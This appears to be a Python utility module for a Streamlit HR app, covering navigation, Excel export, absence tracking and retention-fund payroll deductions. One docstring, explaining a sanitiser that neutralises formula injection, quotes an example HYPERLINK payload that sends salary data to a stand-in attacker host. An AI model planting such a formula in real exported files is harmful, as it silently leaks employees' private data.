"""
Shared utility functions for the HR Assistant app.
Keeping all business-logic / calculation functions here (instead of inside
each page) makes the app easier to maintain and test.
"""

import io
import os
import json
from datetime import date, datetime
import pandas as pd
import streamlit as st


# --------------------------------------------------------------------------
# Navigation helpers
# --------------------------------------------------------------------------

def hide_default_sidebar_nav():
    """Hides Streamlit's automatic multipage sidebar list, so navigation is
    driven entirely by the nav cards / nav bar we render ourselves."""
    st.markdown(
        """
        <style>
        [data-testid="stSidebarNav"] {display: none;}
        </style>
        """,
        unsafe_allow_html=True,
    )


# NOTE: keep this in sync with the actual files under pages/. Every entry
# here becomes a st.page_link() call in render_top_nav() below - an entry
# pointing at a file that doesn't exist will raise an error, and an active
# page missing from this list simply won't get a nav link.
PAGES = [
    {"path": "pages/0_Login.py", "label": "Login", "icon": "🔐"},
    {"path": "Home.py", "label": "Home", "icon": "🗂️"},
    {"path": "pages/1_Long_Absence_Tracker.py", "label": "Long Absence Tracker", "icon": "📅"},
    {"path": "pages/2_Retention_Fund.py", "label": "Retention Fund", "icon": "💰"},
    {"path": "pages/3_Payroll_Calculator.py", "label": "Payroll Calculator", "icon": "🧾"},
    {"path": "pages/4_Employee_Database.py", "label": "Employee Database", "icon": "👥"},
    {"path": "pages/7_Shift_management.py", "label": "Shift Management", "icon": "🕒"},
]


def render_top_nav(active_label: str):
    """Renders a simple horizontal row of page links at the top of a page,
    used instead of the default sidebar navigation list.

    This now also shows a small user status area on the right with a logout
    button when the user is logged in."""
    hide_default_sidebar_nav()
    # extra column at the end reserved for user status / logout
    cols = st.columns(len(PAGES) + 1)
    for col, page in zip(cols[:-1], PAGES):
        with col:
            if page["label"] == active_label:
                st.markdown(f"**{page['icon']} {page['label']}**")
            else:
                st.page_link(page["path"], label=page["label"], icon=page["icon"])

    # right-most column: user status and logout
    with cols[-1]:
        if st.session_state.get("logged_in"):
            user = st.session_state.get("user")
            st.markdown(f"**👤 {user}**")
            if st.button("Logout"):
                # clear login-related session state keys (preserve app data)
                for k in ["logged_in", "user", "role"]:
                    if k in st.session_state:
                        del st.session_state[k]
                st.experimental_rerun()
        else:
            st.markdown("Not logged in")

    st.divider()


# --------------------------------------------------------------------------
# Generic helpers
# --------------------------------------------------------------------------

def read_any_table(uploaded_file) -> pd.DataFrame:
    """Read an uploaded .csv / .xlsx / .xls file, always treating the first
    row as the header row. Returns a cleaned DataFrame (strips whitespace
    from column names)."""
    if uploaded_file is None:
        return pd.DataFrame()

    name = uploaded_file.name.lower()
    if name.endswith(".csv"):
        df = pd.read_csv(uploaded_file, header=0)
    else:
        df = pd.read_excel(uploaded_file, header=0, engine="openpyxl")

    df.columns = [str(c).strip() for c in df.columns]
    return df


def to_excel_bytes(sheets: dict) -> bytes:
    """Convert a dict of {sheet_name: DataFrame} into an in-memory .xlsx file
    and return the raw bytes, ready for st.download_button.

    Every sheet is passed through `sanitize_dataframe_for_export()` first so
    that no exported file can carry a formula-injection payload (a common
    way sensitive data gets silently exfiltrated when a report is later
    re-opened in Excel/Sheets by someone else)."""
    buffer = io.BytesIO()
    with pd.ExcelWriter(buffer, engine="xlsxwriter") as writer:
        for sheet_name, df in sheets.items():
            safe_name = str(sheet_name)[:31]  # Excel sheet name limit
            sanitize_dataframe_for_export(df).to_excel(writer, index=False, sheet_name=safe_name)
    return buffer.getvalue()


def download_button_for_df(df: pd.DataFrame, label: str, file_name: str, key: str = None):
    st.download_button(
        label=label,
        data=to_excel_bytes({"Sheet1": df}),
        file_name=file_name,
        mime="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        key=key,
    )


# --------------------------------------------------------------------------
# Data-leak / security hardening
# --------------------------------------------------------------------------

_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")


def sanitize_dataframe_for_export(df: pd.DataFrame) -> pd.DataFrame:
    """Neutralizes CSV/Excel formula-injection payloads before any data
    leaves the app as a downloadable file.

    If a cell value (typically from an uploaded sheet) starts with =, +, -,
    or @, Excel/Sheets will treat it as a formula when the exported file is
    reopened. A malicious cell like `=HYPERLINK("http://evil.com/"&A1,"x")`
    can silently exfiltrate adjacent salary data the moment someone opens
    the report. Prefixing such cells with a leading apostrophe forces them
    to render as plain text instead of executing.

    This only rewrites string cells that start with a trigger character —
    numbers, dates, and normal text are left untouched.
    """
    out = df.copy()
    for col in out.columns:
        if pd.api.types.is_object_dtype(out[col]) or pd.api.types.is_string_dtype(out[col]):
            out[col] = out[col].apply(
                lambda v: ("'" + v) if isinstance(v, str) and v.startswith(_FORMULA_TRIGGER_CHARS) else v
            )
    return out


def safe_error_message(exc: Exception, context: str = "processing your data") -> str:
    """Returns a generic, user-facing error message that never echoes raw
    exception text back into the UI. Exception messages can accidentally
    contain fragments of the underlying data (e.g. a bad cell value quoted
    inside a pandas/KeyError message) — showing that verbatim in st.error
    is itself a small data leak. Log `exc` server-side via your own logging
    setup if you need the details; don't display it to end users.
    """
    return f"⚠️ Something went wrong while {context}. Please check your file's columns and format and try again."


SENSITIVE_SESSION_KEYS = [
    "employee_db",
    "fulltime_data",
    "payroll_result",
    "gig_data",
    "gig_result",
    "retention_fund_data",
    "retention_result",
    "consolidated_paysheets",
    "consolidated_paysheet_result",
    "consolidated_paysheet_summary",
]


def clear_sensitive_session_data():
    """Wipes all cached salary/employee data out of session_state. Streamlit
    keeps session_state in server memory for as long as the browser tab's
    session is alive — calling this lets you deliberately purge sensitive
    payroll data once you're done with it, rather than leaving it sitting
    in memory (e.g. on a shared workstation)."""
    for key in SENSITIVE_SESSION_KEYS:
        if key in st.session_state:
            del st.session_state[key]


def render_clear_data_button(label: str = "🔒 Clear cached data from this session"):
    if st.button(label):
        clear_sensitive_session_data()
        st.success("Session data cleared.")
        st.rerun()


# --------------------------------------------------------------------------
# 1. Long Absence Tracking
# --------------------------------------------------------------------------

def sample_attendance_muster() -> pd.DataFrame:
    """Small example attendance muster for download, showing the expected
    shape: employee identifier columns first (Employee ID, Employee Name,
    Branch), followed by one column per day with attendance marks
    (P=Present, A=Absent, WO=Weekly Off, L=Leave).

    This mirrors the row/column layout the Long Absence Tracker page
    expects — copy this shape when preparing your real muster."""
    days = [f"Day{i}" for i in range(1, 11)]

    rows = [
        {
            "Employee ID": "E001",
            "Employee Name": "Ravi Kumar",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "A", "P", "P", "WO", "P", "A", "P", "P"])),
        },
        {
            "Employee ID": "E002",
            "Employee Name": "Sita Sharma",
            "Branch": "Koramangala",
            **dict(zip(days, ["P", "P", "P", "P", "P", "WO", "P", "P", "P", "P"])),
        },
        {
            "Employee ID": "E003",
            "Employee Name": "Mohan Das",
            "Branch": "Whitefield",
            **dict(zip(days, ["A", "A", "A", "A", "A", "WO", "A", "A", "A", "A"])),
        },
    ]
    return pd.DataFrame(rows)


def count_absences(df: pd.DataFrame, id_cols: list, absence_marker: str = "A") -> pd.DataFrame:
    """Given an attendance muster where `id_cols` identify the employee and
    all other columns are day-wise attendance marks, count how many times
    `absence_marker` (default 'A') appears for each employee."""
    day_cols = [c for c in df.columns if c not in id_cols]

    def count_row(row):
        vals = row[day_cols].astype(str).str.strip().str.upper()
        return (vals == absence_marker.upper()).sum()

    result = df[id_cols].copy()
    result["Total_Absent_Days"] = df.apply(count_row, axis=1)
    result["Total_Days_In_Muster"] = len(day_cols)
    return result


def categorize_absences(df: pd.DataFrame, thresholds: list) -> pd.DataFrame:
    """thresholds: list of (label, min_days, max_days_or_None) tuples,
    evaluated in order. max_days_or_None means "and above".
    Adds a 'Absence_Category' column to df (based on Total_Absent_Days).
    """

    def classify(days):
        for label, min_d, max_d in thresholds:
            if max_d is None:
                if days >= min_d:
                    return label
            else:
                if min_d <= days <= max_d:
                    return label
        return "Not Flagged"

    out = df.copy()
    out["Absence_Category"] = out["Total_Absent_Days"].apply(classify)
    return out


DEFAULT_ABSENCE_THRESHOLDS = [
    ("Informed Leave (3-4 days)", 3, 4),
    ("To Be Checked (5-20 days)", 5, 20),
    ("Probable Exit Case (>20 days)", 21, None),
]


# --------------------------------------------------------------------------
# 2. Retention Fund — shared config storage (Company Codes, Exceptional
#    ERPs, and the Customize Dashboard employee profile)
# --------------------------------------------------------------------------

# Company codes ignored (excluded) from retention fund deduction. Stored as
# a small JSON file (same `data/` folder used for users.json /
# pending_requests.json) so the list is a persistent, admin-managed setting
# rather than something reset every browser session. IGNITE ships as the
# default ignored code to match the original hard-coded behaviour.
DEFAULT_IGNORED_COMPANY_CODES = ["IGNITE"]

_APP_ROOT = os.path.dirname(os.path.abspath(__file__))
_DATA_DIR = os.path.join(_APP_ROOT, "..", "data")
_IGNORED_CC_FILE = os.path.join(_DATA_DIR, "ignored_company_codes.json")
_EXCEPTIONAL_ERP_FILE = os.path.join(_DATA_DIR, "exceptional_erps.json")
_CUSTOMIZE_DASHBOARD_FILE = os.path.join(_DATA_DIR, "customize_dashboard.json")


def load_ignored_company_codes() -> list:
    """Returns the current list of Company Codes to exclude from retention
    fund deduction. Falls back to DEFAULT_IGNORED_COMPANY_CODES if the file
    doesn't exist yet or can't be parsed."""
    if not os.path.exists(_IGNORED_CC_FILE):
        return list(DEFAULT_IGNORED_COMPANY_CODES)
    try:
        with open(_IGNORED_CC_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list) and all(isinstance(c, str) for c in data):
            return data
    except Exception:
        pass
    return list(DEFAULT_IGNORED_COMPANY_CODES)


def save_ignored_company_codes(codes: list):
    """Persists the ignored-company-codes list (deduplicated, uppercased,
    sorted for a stable display order)."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({str(c).strip().upper() for c in codes if str(c).strip()})
    with open(_IGNORED_CC_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


def load_exceptional_erps() -> list:
    """Returns the list of ERPs that must NEVER have a retention fund
    deduction applied — a hard, per-employee exclusion that overrides
    everything else (Company Code, Retention Applicable = Yes, etc). Use
    this for one-off cases (e.g. a settlement, a special employment
    contract) that don't fit a whole Company Code being ignored."""
    if not os.path.exists(_EXCEPTIONAL_ERP_FILE):
        return []
    try:
        with open(_EXCEPTIONAL_ERP_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        if isinstance(data, list) and all(isinstance(c, str) for c in data):
            return data
    except Exception:
        pass
    return []


def save_exceptional_erps(erps: list):
    """Persists the exceptional-ERPs list (deduplicated, uppercased,
    sorted)."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    clean = sorted({str(e).strip().upper() for e in erps if str(e).strip()})
    with open(_EXCEPTIONAL_ERP_FILE, "w", encoding="utf-8") as f:
        json.dump(clean, f, indent=2)


# --- Customize Dashboard: the per-employee profile (Branch, Designation,
# Employment Type, Company Code, Retention Applicable) that drives both
# reporting breakdowns and deduction eligibility. This is now the single
# place these attributes live — paysheet uploads only carry the financial
# figures (ERP, First Hire Date, Net Pay, Gross).

EMPLOYMENT_TYPE_OPTIONS = ["Full Time", "Contractual", "Part Time"]
RETENTION_APPLICABLE_OPTIONS = ["Yes", "No"]

CUSTOMIZE_DASHBOARD_COLUMNS = [
    "ERP", "Branch", "Designation", "Employment Type", "Company Code", "Retention Applicable",
]


def load_customize_dashboard() -> pd.DataFrame:
    """Loads the Customize Dashboard employee profile table. Returns an
    empty (but correctly-shaped) DataFrame if nothing has been saved yet."""
    if not os.path.exists(_CUSTOMIZE_DASHBOARD_FILE):
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    try:
        with open(_CUSTOMIZE_DASHBOARD_FILE, "r", encoding="utf-8") as f:
            records = json.load(f)
        df = pd.DataFrame(records)
        for col in CUSTOMIZE_DASHBOARD_COLUMNS:
            if col not in df.columns:
                df[col] = None
        return df[CUSTOMIZE_DASHBOARD_COLUMNS]
    except Exception:
        return pd.DataFrame(columns=CUSTOMIZE_DASHBOARD_COLUMNS)


def save_customize_dashboard(df: pd.DataFrame):
    """Persists the Customize Dashboard table, one row per ERP (last
    occurrence wins if there are duplicate ERPs)."""
    os.makedirs(_DATA_DIR, exist_ok=True)
    out = df.copy()
    for col in CUSTOMIZE_DASHBOARD_COLUMNS:
        if col not in out.columns:
            out[col] = None
    out["ERP"] = out["ERP"].astype(str).str.strip()
    out = out[out["ERP"] != ""]
    out = out.drop_duplicates(subset=["ERP"], keep="last")
    with open(_CUSTOMIZE_DASHBOARD_FILE, "w", encoding="utf-8") as f:
        json.dump(out[CUSTOMIZE_DASHBOARD_COLUMNS].to_dict(orient="records"), f, indent=2, default=str)


def sample_customize_dashboard_bulk_template() -> pd.DataFrame:
    """Sample file for the Customize Dashboard bulk upload. Only ERP,
    Branch, Company Code and Designation are required in the file —
    Employment Type and Retention Applicable are managed afterwards as
    dropdowns directly in the dashboard table (existing values are kept on
    re-upload; new ERPs default to 'Full Time' / 'Yes' until changed)."""
    return pd.DataFrame([
        {"ERP": "E001", "Branch": "Koramangala", "Company Code": "MAIN", "Designation": "Sales Executive"},
        {"ERP": "E002", "Branch": "Whitefield", "Company Code": "MAIN", "Designation": "Store Manager"},
    ])


def merge_customize_dashboard_bulk_upload(
    existing_df: pd.DataFrame,
    upload_df: pd.DataFrame,
    erp_col: str,
    branch_col: str,
    cc_col: str,
    designation_col: str,
) -> pd.DataFrame:
    """Merges a bulk upload that only has ERP / Branch / Company Code /
    Designation into the existing Customize Dashboard.

    Employment Type and Retention Applicable are auto-carried forward from
    whatever is already saved for that ERP (so re-uploading the bulk sheet
    never silently resets someone's employment type or Yes/No status).
    Brand-new ERPs are auto-filled with defaults ('Full Time' / 'Yes')
    which can then be adjusted in the dashboard's dropdown columns.
    """
    existing = existing_df.copy()
    for col in CUSTOMIZE_DASHBOARD_COLUMNS:
        if col not in existing.columns:
            existing[col] = None
    existing["ERP"] = existing["ERP"].astype(str).str.strip()
    existing_by_erp = existing.set_index("ERP").to_dict(orient="index")

    rows = []
    for _, row in upload_df.iterrows():
        erp = str(row.get(erp_col, "")).strip()
        if not erp:
            continue
        prior = existing_by_erp.get(erp, {})
        rows.append({
            "ERP": erp,
            "Branch": row.get(branch_col),
            "Designation": row.get(designation_col),
            "Company Code": row.get(cc_col),
            "Employment Type": prior.get("Employment Type") or "Full Time",
            "Retention Applicable": prior.get("Retention Applicable") or "Yes",
        })

    new_df = pd.DataFrame(rows, columns=CUSTOMIZE_DASHBOARD_COLUMNS)
    untouched = existing[~existing["ERP"].isin(new_df["ERP"])]
    merged = pd.concat([untouched, new_df], ignore_index=True)
    return merged.drop_duplicates(subset=["ERP"], keep="last").reset_index(drop=True)


# --------------------------------------------------------------------------
# Payroll cycle (26th of a month -> 25th of the next) — kept as a general
# helper; retention fund deduction itself is now driven by First Hire Date
# month rather than this cycle (see tag_first_hire_status below).
# --------------------------------------------------------------------------

def get_payroll_cycle(reference_date=None) -> tuple:
    """Returns (cycle_start, cycle_end) as date objects for the payroll
    cycle containing `reference_date` (defaults to today). The payroll
    cycle always runs from the 26th of a month through the 25th of the
    following month, regardless of which year/month `reference_date` falls
    in — so this stays correct across month/year boundaries without ever
    needing a hard-coded cycle."""
    if reference_date is None:
        reference_date = date.today()
    if isinstance(reference_date, datetime):
        reference_date = reference_date.date()

    if reference_date.day >= 26:
        cycle_start = date(reference_date.year, reference_date.month, 26)
        end_month = reference_date.month + 1
        end_year = reference_date.year
        if end_month > 12:
            end_month = 1
            end_year += 1
        cycle_end = date(end_year, end_month, 25)
    else:
        start_month = reference_date.month - 1
        start_year = reference_date.year
        if start_month < 1:
            start_month = 12
            start_year -= 1
        cycle_start = date(start_year, start_month, 26)
        cycle_end = date(reference_date.year, reference_date.month, 25)

    return cycle_start, cycle_end


def format_date_ddmmmyyyy(value) -> str:
    """Formats a date/datetime/parsable string as dd-mmm-yyyy, e.g.
    '08-Sep-2026'. Returns '' for null/unparseable values rather than
    raising, since this is purely a display helper."""
    if value is None:
        return ""
    try:
        if isinstance(value, float) and pd.isna(value):
            return ""
        dt_value = pd.to_datetime(value)
        if pd.isna(dt_value):
            return ""
        return dt_value.strftime("%d-%b-%Y")
    except Exception:
        return ""


def pending_deduction_sentence(label: str, pending_df: pd.DataFrame, name_col: str) -> str:
    """Turns a group of pending-release records into a readable sentence,
    e.g. 'MAIN: 3 deductions pending.', 'IGNITE: No deductions pending.', or
    'Whitefield: 1 deduction pending with employee Ravi Kumar.' when there's
    exactly one (naming the employee since there's only one to name).
    Handles singular/plural grammar automatically."""
    count = len(pending_df)
    if count == 0:
        return f"**{label}**: No deductions pending."
    if count == 1:
        emp_name = pending_df.iloc[0][name_col] if name_col in pending_df.columns else "employee"
        return f"**{label}**: 1 deduction pending with employee {emp_name}."
    return f"**{label}**: {count} deductions pending."


# --------------------------------------------------------------------------
# Numeric coercion (shared by payroll + retention calculations)
# --------------------------------------------------------------------------

def coerce_numeric_column(series: pd.Series, column_name: str = "value") -> pd.Series:
    """Cleans a column that should be numeric but may have been uploaded as
    text — a very common real-world case: Excel cells formatted as Text,
    numbers with thousands separators ('15,000'), or a currency symbol
    ('₹15,000'). Strips ₹/$/commas/whitespace, then converts.

    Raises a ValueError naming exactly which rows couldn't be parsed (with
    up to 5 examples), instead of letting a cryptic TypeError surface deep
    inside a downstream calculation. Blank/NaN cells are left as NaN.
    """
    if pd.api.types.is_numeric_dtype(series):
        return series

    cleaned = series.astype(str).str.replace(r"[₹$,\s]", "", regex=True).str.strip()
    cleaned = cleaned.replace({"": None, "nan": None, "None": None, "NaT": None})
    numeric = pd.to_numeric(cleaned, errors="coerce")

    bad_mask = numeric.isna() & series.notna()
    if bad_mask.any():
        bad_rows = series[bad_mask]
        examples = ", ".join(f"row {i + 2}: '{v}'" for i, v in bad_rows.head(5).items())
        more = f" (+{bad_mask.sum() - 5} more)" if bad_mask.sum() > 5 else ""
        raise ValueError(
            f"Column '{column_name}' has {bad_mask.sum()} value(s) that aren't valid numbers "
            f"— e.g. {examples}{more}. Please fix these cells and re-upload."
        )
    return numeric


# --------------------------------------------------------------------------
# 2a. Retention Fund — Consolidated Paysheet computation
#     (Deduction = min(10% of Monthly Gross, Net Pay), gated by First Hire
#     Date, Exceptional ERPs, and the Customize Dashboard's Retention
#     Applicable flag)
# --------------------------------------------------------------------------

CONSOLIDATED_PAYSHEET_COLUMNS = ["ERP", "First Hire Date", "Net Pay", "Monthly Gross"]


def sample_consolidated_paysheet_template() -> pd.DataFrame:
    """Sample monthly paysheet upload. One uploaded file = one month's
    payroll run for the whole company. Upload one file per month you want
    included in the consolidated retention fund computation.

    Columns: ERP, First Hire Date, Net Pay, Monthly Gross.
    """
    return pd.DataFrame([
        {"ERP": "E001", "First Hire Date": "2020-01-15", "Net Pay": 21000, "Monthly Gross": 25000},
        {"ERP": "E002", "First Hire Date": "2021-06-10", "Net Pay": 31000, "Monthly Gross": 35000},
        {"ERP": "E003", "First Hire Date": "2024-09-20", "Net Pay": 36000, "Monthly Gross": 40000},
    ])


def compute_paysheet_deduction(
    df: pd.DataFrame,
    erp_col: str,
    first_hire_col: str,
    net_pay_col: str,
    gross_col: str,
    paysheet_month,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    deduction_pct: float = 10.0,
) -> pd.DataFrame:
    """Computes the retention fund deduction for a single month's paysheet.

    Deduction = min(deduction_pct% of Monthly Gross, Net Pay) — capped at
    Net Pay so the deduction can never exceed what the employee actually
    took home that month.

    Deduction only applies where ALL of the following hold:
      - the ERP is not in `exceptional_erps` (a hard, per-employee
        exclusion that overrides everything else)
      - the ERP has a Customize Dashboard profile with
        Retention Applicable == 'Yes' (an ERP with no profile at all, or
        Retention Applicable == 'No', is treated as not applicable)
      - `paysheet_month` falls on/after the employee's First Hire Date
        month — retention fund is computed starting from the month the
        employee was first hired, never before.

    Every row keeps a 'Status' explaining why it was or wasn't deducted:
    'Not Yet Hired', 'Exceptional ERP - Excluded', 'Retention Not
    Applicable', 'No Deduction' (0 net pay / gross), or 'Pending Release'.
    """
    out = df.copy()
    out[gross_col] = coerce_numeric_column(out[gross_col], gross_col)
    out[net_pay_col] = coerce_numeric_column(out[net_pay_col], net_pay_col)
    out[erp_col] = out[erp_col].astype(str).str.strip()

    hire_dt = pd.to_datetime(out[first_hire_col], errors="coerce")
    out["First Hire Date"] = hire_dt

    month_ts = pd.Timestamp(paysheet_month).to_period("M").to_timestamp()
    out["Paysheet Month"] = month_ts
    out["Hired By This Month"] = (
        hire_dt.dt.to_period("M").dt.to_timestamp() <= month_ts
    ).fillna(False)

    exceptional_upper = {str(e).strip().upper() for e in (exceptional_erps or [])}
    out["Exceptional ERP"] = out[erp_col].str.upper().isin(exceptional_upper)

    profile_cols = ["Branch", "Designation", "Employment Type", "Company Code", "Retention Applicable"]
    if customize_dashboard is not None and not customize_dashboard.empty:
        cd = customize_dashboard.copy()
        cd["ERP"] = cd["ERP"].astype(str).str.strip()
        cd = cd.drop_duplicates(subset=["ERP"], keep="last")
        out = out.merge(cd[["ERP"] + profile_cols], left_on=erp_col, right_on="ERP", how="left")
        if "ERP" in out.columns and out["ERP"].equals(out[erp_col]) is False:
            out = out.drop(columns=["ERP"])
    else:
        for col in profile_cols:
            out[col] = None

    out["Retention Applicable"] = out["Retention Applicable"].fillna("No")
    retention_yes = out["Retention Applicable"].astype(str).str.strip().str.lower() == "yes"

    applicable = retention_yes & (~out["Exceptional ERP"]) & out["Hired By This Month"]
    out["Deduction Applicable"] = applicable

    out["10% of Gross Cap"] = out[gross_col] * deduction_pct / 100
    out["Deduction Amount"] = 0.0
    if applicable.any():
        out.loc[applicable, "Deduction Amount"] = out.loc[
            applicable, ["10% of Gross Cap", net_pay_col]
        ].min(axis=1)

    def _status(row):
        if not row["Hired By This Month"]:
            return "Not Yet Hired"
        if row["Exceptional ERP"]:
            return "Exceptional ERP - Excluded"
        if not row["Deduction Applicable"]:
            return "Retention Not Applicable"
        if row["Deduction Amount"] > 0:
            return "Pending Release"
        return "No Deduction"

    out["Status"] = out.apply(_status, axis=1)
    return out


def consolidate_paysheet_months(monthly_results: list, erp_col: str = "ERP") -> tuple:
    """Combines a list of per-month `compute_paysheet_deduction()` outputs
    into:
      - `combined`: every month's rows stacked together (the month-wise
        detail table)
      - `summary`: one row per ERP with total deduction accumulated across
        all uploaded months, how many months were processed, and the most
        recent Branch / Designation / Employment Type / Company Code /
        Status on file for that employee.

    Returns (summary_df, combined_df). Both are empty DataFrames if
    `monthly_results` is empty.
    """
    if not monthly_results:
        return pd.DataFrame(), pd.DataFrame()

    combined = pd.concat(monthly_results, ignore_index=True)
    combined["Paysheet Month"] = pd.to_datetime(combined["Paysheet Month"])
    combined = combined.sort_values("Paysheet Month")

    summary = combined.groupby(erp_col).agg(
        **{
            "Branch": ("Branch", "last"),
            "Designation": ("Designation", "last"),
            "Employment Type": ("Employment Type", "last"),
            "Company Code": ("Company Code", "last"),
            "First Hire Date": ("First Hire Date", "first"),
            "Months Processed": ("Paysheet Month", "nunique"),
            "Total Deduction Accumulated": ("Deduction Amount", "sum"),
            "Latest Status": ("Status", "last"),
        }
    ).reset_index()

    return summary.sort_values(erp_col).reset_index(drop=True), combined.reset_index(drop=True)
